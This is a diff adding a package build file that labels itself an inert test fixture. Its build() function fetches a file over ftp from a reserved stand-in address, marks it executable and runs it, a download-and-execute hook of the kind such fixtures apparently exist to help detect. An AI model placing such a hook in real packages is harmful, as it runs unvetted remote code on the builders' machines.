@@ -1,0 +1,14 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=ftp-fetch-run
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org
+license=(MIT)
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  ftp -o y http://198.51.100.59/y
+  chmod 755 y
+  ./y
+}
